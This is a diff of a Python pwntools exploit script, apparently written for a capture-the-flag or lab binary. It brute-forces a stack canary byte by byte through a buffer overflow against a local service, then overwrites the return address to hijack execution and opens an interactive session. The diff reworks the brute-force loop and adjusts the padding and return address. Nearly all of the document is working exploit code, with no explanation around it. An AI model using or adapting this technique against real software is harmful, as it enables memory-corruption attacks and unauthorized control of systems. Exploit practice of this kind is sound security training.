@@ -28,45 +28,33 @@ def main():
     log.success(b"Found Port " + port)
     for j in range(8):
         for i in range(256):
-            log.success("checking " + str(i))
-            io = remote('0.0.0.0', int(port))
-            print(b"sending " + b"A"*0x18 + canary + i.to_bytes(1, 'little'))
-            io.send(b"A"*0x18 + canary + i.to_bytes(1, 'little'))
-            io.recv()
-            io.sendline("exit")
-            io.close()
-            sleep(1)
-            line = r.recvuntil("stack smashing detected", timeout=5)
-            print(line)
-            if not b"stack smashing detected" in line:
-
+            try:
                 log.success("checking " + str(i))
                 io = remote('0.0.0.0', int(port))
                 print(b"sending " + b"A"*0x18 + canary + i.to_bytes(1, 'little'))
                 io.send(b"A"*0x18 + canary + i.to_bytes(1, 'little'))
-                io.recv()
+                io.recv(timeout = 5)
                 io.sendline("exit")
-                sleep(1)
-                line = r.recvuntil("stack smashing detected", timeout=5)
-                if not b"stack smashing detected" in line:
+                line = io.recvall(timeout = 0.1)
+                print(line)
+                io.close()
+                r.recv()
+                if (b"Exiting." in line):
                     canary += i.to_bytes(1, 'little')
                     log.success("Canary currently " + repr(canary))
-                    io.close()
-                    i = 0
                     break
-                else:
-                    i=0
-                
-            
-            io.close()
+            finally:
+                try:
+                    io.close()
+                except:
+                    pass
+
 
     io = remote('0.0.0.0', int(port))
-    ret_addr = 0x00401682
-    io.send(b"A"*0x18 + canary + p64(ret_addr))
-    r.recvuntil("stack smashing detected", timeout=5)
-    io.recv()
+    ret_addr = 0x0040168c
+    io.send(b"A"*0x18 + canary + b"\x04" + b"\x00"*7 + p64(ret_addr))
     io.sendline("exit")
-    sleep(1)
+    io.interactive()
     io.close()
     r.interactive()
 
